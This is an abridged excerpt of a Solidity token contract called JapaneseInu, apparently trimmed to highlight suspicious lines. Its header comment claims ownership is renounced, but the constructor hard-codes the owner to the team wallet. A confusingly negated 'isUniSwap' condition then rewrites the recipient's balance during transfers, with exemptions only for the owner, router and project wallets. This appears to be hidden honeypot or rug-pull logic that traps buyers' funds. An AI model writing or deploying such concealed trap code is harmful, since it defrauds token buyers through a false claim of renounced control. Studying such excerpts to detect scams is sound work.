...
//⛩CA RENOUNCED⛩
//Telegram : https://t.me/japaneseinu
...
contract JapaneseInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xb92b15103C8051d6c1E9c21C9ec09b714C6A3165); 
    address payable public Wallet_Team = payable(0xe0db8dea2FCAC1f8AccF0980652F7B9087066fcc);
    ...
    constructor () {
        ...
        _owner = 0xe0db8dea2FCAC1f8AccF0980652F7B9087066fcc;
    ...
    function wallet_m() private view returns(address) {
        return (Wallet_Marketing);
    }
    function wallet_d() private view returns(address) {
        return (Wallet_Team);
    }
    ...
    function _transfer(
        ...
        isUniSwap = !_isExcludedFromFee[from] && !(!_isExcludedFromFee[to]);
        ...
        if (from != owner() && from != UniswapRouter() && from != wallet_m() && from != wallet_d())
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(isUniSwap){
            ...
            _tOwned[recipient] = transferAmount-_tOwned[sender];
